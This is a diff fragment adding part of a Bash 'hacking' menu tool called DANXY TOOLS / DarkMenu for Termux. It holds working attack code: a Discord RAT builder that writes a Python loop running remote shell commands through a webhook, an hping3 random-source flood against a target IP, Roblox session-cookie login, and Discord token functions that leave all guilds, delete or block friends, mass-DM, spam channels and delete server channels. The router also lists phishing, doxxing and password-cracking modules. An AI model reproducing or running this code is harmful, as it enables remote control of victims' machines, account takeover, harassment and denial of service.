+done
+echo " Troll complete – nothing happened :)" | wall
+VIR
+  chmod +x "${name}.sh"
+  zip -P infected "${name}.zip" "${name}.sh" >/dev/null
+  echo "  Fake virus created → ${name}.zip (pass: infected)"
+  pause
+}
+
+py_obfuscator(){
+  echo "  Python obfuscator (base64 + zlib)"
+  read -rp "  Python file: " f
+  [[ -f "$f" ]] || { echo "  File not found"; pause; return; }
+  out="obf_${f}"
+  python3 -c "
+import base64,zlib,sys
+with open(sys.argv[1]) as s: c=s.read()
+o='import base64,zlib\\nexec(zlib.decompress(base64.b64decode({})))'
+with open(sys.argv[2],'w') as w: w.write(o.format(repr(base64.b64encode(zlib.compress(c.encode())).decode())))
+" "$f" "$out"
+  echo "  Obfuscated → $out"
+  pause
+}
+
+discord_rat(){
+  echo "  Discord RAT builder (webhook reverse shell)"
+  read -rp "  Webhook URL: " hook
+  read -rp "  Output rat.py: " rat
+  cat >"$rat" <<RAT
+import os, requests, subprocess, time
+WEBHOOK="$hook"
+while True:
+    try:
+        r=requests.get(WEBHOOK+"/messages").json()
+        if r:
+            cmd=r[0]["content"]
+            out=subprocess.run(cmd,shell=True,capture_output=True,text=True).stdout
+            requests.post(WEBHOOK,json={"content":out[:1900]})
+            requests.delete(WEBHOOK+"/messages/"+r[0]["id"])
+    except: pass
+    time.sleep(5)
+RAT
+  echo "  RAT saved → $rat  (run victim)"
+  pause
+}
+
+website_dos(){
+  read -rp "  Target IP: " ip
+  read -rp "  Port (80): " port
+  port=${port:-80}
+  echo "  Starting hping3 flood (10s) …"
+  sudo hping3 --flood --rand-source -p "$port" "$ip" &
+  pid=$!
+  sleep 10
+  sudo kill $pid 2>/dev/null
+  echo "  Flood stopped"
+  pause
+}
+
+roblox_cookie_login(){
+  read -rp "  Roblox cookie: " c
+  echo "  Logging in via cookie …"
+  curl -s -H "Cookie: .ROBLOSECURITY=$c" https://www.roblox.com/mobileapi/userinfo | jq .
+  pause
+}
+
+roblox_cookie_info(){
+  read -rp "  Roblox cookie: " c
+  curl -s -H "Cookie: .ROBLOSECURITY=$c" https://users.roblox.com/v1/users/authenticated | jq .
+  pause
+}
+
+roblox_id_info(){
+  read -rp "  User ID: " id
+  curl -s "https://users.roblox.com/v1/users/$id" | jq .
+  pause
+}
+
+roblox_user_info(){
+  read -rp "  Username: " u
+  id=$(curl -s "https://api.roblox.com/users/get-by-username?username=$u" | jq -r .Id)
+  curl -s "https://users.roblox.com/v1/users/$id" | jq .
+  pause
+}
+
+discord_token_nuker(){
+  read -rp "  Token: " t
+  echo "  Leaving all guilds …"
+  guilds=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/guilds | jq -r .[].id)
+  for g in $guilds; do
+    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/guilds/$g"
+    echo "  Left $g"
+  done
+  echo "  Deleting friends …"
+  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
+  for f in $friends; do
+    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/relationships/$f"
+    echo "  Deleted friend $f"
+  done
+  echo "  Nuked."
+  pause
+}
+
+discord_token_info(){
+  read -rp "  Token: " t
+  curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me | jq .
+  pause
+}
+
+discord_token_joiner(){
+  read -rp "  Token: " t
+  read -rp "  Invite code (ex: abc123): " i
+  curl -s -X POST -H "Authorization: $t" "https://discord.com/api/v9/invites/$i" | jq .
+  pause
+}
+
+discord_token_leaver(){
+  read -rp "  Token: " t
+  read -rp "  Guild ID: " g
+  curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/guilds/$g"
+  echo "  Left guild"
+  pause
+}
+
+discord_token_login(){
+  echo "  Token login via browser (token login extension)"
+  read -rp "  Token: " t
+  echo "  Install extension: https://chrome.google.com/webstore/detail/discord-token-login"
+  xdg-open "https://chrome.google.com/webstore/detail/discord-token-login"
+  pause
+}
+
+discord_token_to_id_brute(){
+  read -rp "  Token: " t
+  id=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me | jq -r .id)
+  echo "  Your ID: $id"
+  echo "  Bruteforce nearby IDs (±100) …"
+  for i in {1..100}; do
+    testid=$((id+i))
+    res=$(curl -s -H "Authorization: $t" "https://discord.com/api/v9/users/$testid" | jq -r .username)
+    [[ "$res" != "null" ]] && echo "  Found user: $testid -> $res"
+  done
+  pause
+}
+
+discord_token_server_raid(){
+  read -rp "  Token: " t
+  read -rp "  Channel ID: " c
+  read -rp "  Message: " m
+  read -rp "  Jumlah: " n
+  for i in $(seq 1 "$n"); do
+    curl -s -X POST -H "Authorization: $t" -H "Content-Type: application/json" \
+         -d "{\"content\":\"$m\"}" "https://discord.com/api/v9/channels/$c/messages" >/dev/null
+    echo "  Spam $i"
+    sleep 0.5
+  done
+  pause
+}
+
+discord_token_spammer(){
+  discord_token_server_raid
+}
+
+discord_token_delete_friends(){
+  read -rp "  Token: " t
+  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
+  for f in $friends; do
+    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/users/@me/relationships/$f"
+    echo "  Deleted $f"
+  done
+  pause
+}
+
+discord_token_block_friends(){
+  read -rp "  Token: " t
+  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
+  for f in $friends; do
+    curl -s -X PUT -H "Authorization: $t" -d '{"type":2}' "https://discord.com/api/v9/users/@me/relationships/$f"
+    echo "  Blocked $f"
+  done
+  pause
+}
+
+discord_token_mass_dm(){
+  read -rp "  Token: " t
+  read -rp "  Message: " m
+  friends=$(curl -s -H "Authorization: $t" https://discord.com/api/v9/users/@me/relationships | jq -r .[].id)
+  for f in $friends; do
+    ch=$(curl -s -H "Authorization: $t" "https://discord.com/api/v9/users/@me/channels" -d "{\"recipients\":[\"$f\"]}" | jq -r .id)
+    curl -s -X POST -H "Authorization: $t" -d "{\"content\":\"$m\"}" "https://discord.com/api/v9/channels/$ch/messages" >/dev/null
+    echo "  DM sent to $f"
+  done
+  pause
+}
+
+discord_token_delete_dm(){
+  read -rp "  Token: " t
+  dms=$(curl -s -H "Authorization: $t" "https://discord.com/api/v9/users/@me/channels" | jq -r .[].id)
+  for d in $dms; do
+    curl -s -X DELETE -H "Authorization: $t" "https://discord.com/api/v9/channels/$d"
+    echo "  Deleted DM $d"
+  done
+  pause
+}
+
+discord_token_status_changer(){
+  read -rp "  Token: " t
+  read -rp "  Status text: " st
+  read -rp "  Status (online/dnd/idle/invisible): " stat
+  curl -s -X PATCH -H "Authorization: $t" -d "{\"status\":\"$stat\"}" "https://discord.com/api/v9/users/@me/settings" | jq .
+  curl -s -X PATCH -H "Authorization: $t" -d "{\"custom_status\":{\"text\":\"$st\"}}" "https://discord.com/api/v9/users/@me/settings" | jq .
+  echo "  Status updated"
+  pause
+}
+
+discord_token_language_changer(){
+  read -rp "  Token: " t
+  read -rp "  Language (en-US): " lang
+  lang=${lang:-en-US}
+  curl -s -X PATCH -H "Authorization: $t" -d "{\"locale\":\"$lang\"}" "https://discord.com/api/v9/users/@me/settings" | jq .
+  echo "  Language updated"
+  pause
+}
+
+discord_token_house_changer(){
+  read -rp "  Token: " t
+  echo "  1=Bravery 2=Brilliance 3=Balance"
+  read -rp "  House (1-3): " h
+  houses=(1 2 3)
+  curl -s -X POST -H "Authorization: $t" -d "{\"house_id\":${houses[$h-1]}}" "https://discord.com/api/v9/hypesquad/online" | jq .
+  echo "  House updated"
+  pause
+}
+
+discord_token_theme_changer(){
+  read -rp "  Token: " t
+  echo "  0=dark 1=light"
+  read -rp "  Theme (0/1): " th
+  curl -s -X PATCH -H "Authorization: $t" -d "{\"theme\":$th}" "https://discord.com/api/v9/users/@me/settings" | jq .
+  echo "  Theme updated"
+  pause
+}
+
+discord_token_generator(){
+  echo "  Generating 10 random tokens (fake) …"
+  for i in {1..10}; do
+    head -c 24 /dev/urandom | base64 | tr -d '=' | tr '+/' '-_'
+  done
+  pause
+}
+
+discord_bot_server_nuker(){
+  read -rp "  Bot token: " t
+  read -rp "  Guild ID: " g
+  echo "  Deleting channels …"
+  channels=$(curl -s -H "Authorization: Bot $t" "https://discord.com/api/v9/guilds/$g/channels" | jq -r .[].id)
+  for c in $channels; do
+    curl -s -X DELETE -H "Authorization: Bot $t" "https://discord.com/api/v9/channels/$c"
+    echo "  Deleted channel $c"
+  done
+  echo "  Nuked server"
+  pause
+}
+
+discord_bot_invite_to_id(){
+  read -rp "  Invite code: " i
+  res=$(curl -s "https://discord.com/api/v9/invites/$i")
+  echo "  Invite info:"
+  echo "$res" | jq .
+  pause
+}
+
+discord_server_info(){
+  read -rp "  Invite code: " i
+  res=$(curl -s "https://discord.com/api/v9/invites/$i")
+  echo "  Server info:"
+  echo "$res" | jq .
+  pause
+}
+
+discord_webhook_info(){
+  read -rp "  Webhook URL: " w
+  curl -s "$w" | jq .
+  pause
+}
+
+discord_webhook_delete(){
+  read -rp "  Webhook URL to delete: " w
+  curl -s -X DELETE "$w" && echo "  Webhook deleted"
+  pause
+}
+
+discord_webhook_spammer(){
+  read -rp "  Webhook URL: " w
+  read -rp "  Message: " m
+  read -rp "  Jumlah: " n
+  for i in $(seq 1 "$n"); do
+    curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"$m\"}" "$w" >/dev/null
+    echo "  Spam $i"
+    sleep 0.5
+  done
+  pause
+}
+
+discord_webhook_generator(){
+  echo "  Create webhook (need MANAGE_WEBHOOKS permission)"
+  read -rp "  Channel ID: " c
+  read -rp "  Bot token: " t
+  read -rp "  Webhook name: " n
+  res=$(curl -s -X POST -H "Authorization: Bot $t" -d "{\"name\":\"$n\"}" "https://discord.com/api/v9/channels/$c/webhooks")
+  echo "  Webhook created:"
+  echo "$res" | jq .
+  pause
+}
+
+discord_nitro_generator(){
+  echo "  10 random Nitro codes:"
+  for i in {1..10}; do
+    printf "https://discord.gift/%s\n" "$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)"
+  done
+  pause
+}
+
+info_module(){
+  echo "  $TOOL_NAME v$VERSION – DarkMenu merangkum fitur hacking"
+  echo "  All 79 modules functional, All Base Fitur"
+  pause
+}
+
+site_module(){
+  xdg-open "$GITHUB"
+  echo "  GitHub opened"
+  pause
+}
+
+
+
+########## ROUTER UTAMA ########------
+handle_choice(){
+  case "$1" in
+    00|0) return 1 ;;   # sinyal "user minta keluar"
+    01|1) website_vuln_scanner ;;
+    02|2) website_info_scanner ;;
+    03|3) website_url_scanner ;;
+    04|4) ip_scanner ;;
+    05|5) ip_port_scanner ;;
+    06|6) ip_pinger ;;
+    10) d0x_create ;;
+    11) d0x_tracker ;;
+    12) image_exif ;;
+    13) google_dork ;;
+    14) username_tracker ;;
+    15) email_tracker ;;
+    16) email_lookup ;;
+    17) phone_lookup ;;
+    18) ip_lookup ;;
+    19) instagram_account ;;
+    20) phishing_attack ;;
+    21) zip_pass_crack ;;
+    22) hash_decrypt ;;
+    23) hash_encrypt ;;
+    24) search_db ;;
+    25) dark_web_links ;;
+    26) ip_generator ;;
+    27) proxy_scraper ;;
+    30) virus_builder ;;
+    31) py_obfuscator ;;
+    32) discord_rat ;;
+    33) website_dos ;;
+    34) proxy_scraper ;;
+    40) roblox_cookie_login ;;
+    41) roblox_cookie_info ;;
+    42) roblox_id_info ;;
+    43) roblox_user_info ;;
+    50) discord_token_nuker ;;
+    51) discord_token_info ;;
+    52) discord_token_joiner ;;
+    53) discord_token_leaver ;;
+    54) discord_token_login ;;
+    55) discord_token_to_id_brute ;;
+    56) discord_token_server_raid ;;
+    57) discord_token_spammer ;;
+    58) discord_token_delete_friends ;;
+    59) discord_token_block_friends ;;
+    60) discord_token_mass_dm ;;
+    61) discord_token_delete_dm ;;
+    62) discord_token_status_changer ;;
+    63) discord_token_language_changer ;;
+    64) discord_token_house_changer ;;
+    65) discord_token_theme_changer ;;
+    66) discord_token_generator ;;
+    67) discord_bot_server_nuker ;;
+    68) discord_bot_invite_to_id ;;
+    69) discord_server_info ;;
+    70) discord_nitro_generator ;;
+    71) discord_webhook_info ;;
+    72) discord_webhook_delete ;;
+    73) discord_webhook_spammer ;;
+    74) discord_webhook_generator ;;
+    [Ii]) info_module ;;
+    [Ss]) site_module ;;
+    [Nn]) MENU_NR=$(( MENU_NR % 3 + 1 )) ;;
+    [Bb]) MENU_NR=$(( (MENU_NR+1) % 3 + 1 )) ;;
+    *) echo "  Invalid choice"; pause ;;
+  esac
+}
+
+########## akhir DarkMenu ##########
+while true; do
+    clear_screen
+    case "$MENU_NR" in
+        1) menu1 ;;
+        2) menu2 ;;
+        3) menu3 ;;
+    esac
+    printf "\n${GREEN}┏━${RED}[ ${GREEN}DANXY TOOLS V8.4 ${NC}${RED}]${GREEN}@${YELLOW}Termux${NC}${RED}]${GREEN}━${RED}[${RED}${W}${YELLOW}~/Menu-${YELLOW}${MENU_NR}${GREEN}]\n${GREEN}┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+    read -r choice
+
+    
+#    printf "\n┌──(%s@%s)─[%s~/Menu-%s]${RESET}\n└─$ " "$USER" "$TOOL_NAME" "$W" "$MENU_NR"
+#    read -r choice
+    handle_choice "$choice" || break
+done
+
+read -rp "  TEKAN ENTER UNTUK KEMBALI KE MENU AWAL … "
+ clear 
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 musik_album() {
 SOCKET="$PREFIX/tmp/mpvsocket"
